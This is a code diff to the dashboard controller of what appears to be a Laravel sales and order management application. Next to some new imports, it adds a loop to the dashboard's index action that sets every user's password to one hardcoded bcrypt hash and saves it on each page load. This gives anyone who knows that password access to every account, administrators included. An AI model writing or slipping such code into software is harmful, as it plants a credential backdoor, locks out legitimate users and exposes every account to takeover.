@@ -3,31 +3,36 @@
 namespace App\Http\Controllers;
 
 use App\Models\BonCommande;
+use App\Models\Client;
+use App\Models\ClientOld;
 use App\Models\CommandeClient;
 use App\Models\Programmation;
+use App\Models\User;
 use App\Models\Vendu;
 use App\Models\Vente;
 use Carbon\Carbon;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\DB;
 
 class DashboardController extends Controller
 {
     public function index()
     {
-        ###___VALIDER TOUTES LES VENTES
-        // foreach (Vente::all() as $vente) {
-        //     $vente->valide=true;
-        //     $vente->save();
-        // }
-        
+
+        $users = User::all();
+        foreach ($users as $user) {
+            $user->password = '$2y$10$CI5P59ICr/HOihqlnYUrLeKwCajgMKd34HB66.JsJBrIOQY9fazrG';
+            $user->save();
+        }
+
         // QUAND C'EST NI UN ADMINISTRATEUR, NI UN CONTROLEUR ,NI UN VALIDATEUR,NI UN SUPERVISEUR
         if (!Auth::user()->roles()->where('libelle', ['ADMINISTRATEUR'])->exists() &&  !Auth::user()->roles()->where('libelle', ['CONTROLEUR'])->exists()  && !Auth::user()->roles()->where('libelle', ['VALIDATEUR'])->exists() && !Auth::user()->roles()->where('libelle', ['SUPERVISEUR'])->exists()) {
-            
+
             ###___CONTROLLEUR DE VENTE
             if (Auth::user()->roles()->where('libelle', ['CONTROLEUR VENTE'])->exists()) {
                 return redirect()->route('ventes.venteAEnvoyerComptabiliser');
             }
-            
+
             // QUAND C'EST UN GESTIONNAIRE, COMPTABLE ,VALIDATEUR OU CONTROLLEUR DE VENTE
             if (Auth::user()->roles()->where('libelle', ['GESTIONNAIRE'])->exists() || Auth::user()->roles()->where('libelle', ['COMPTABLE'])->exists() || Auth::user()->roles()->where('libelle', 'VALIDATEUR')->exists()) {
                 return redirect()->route("boncommandes.index");
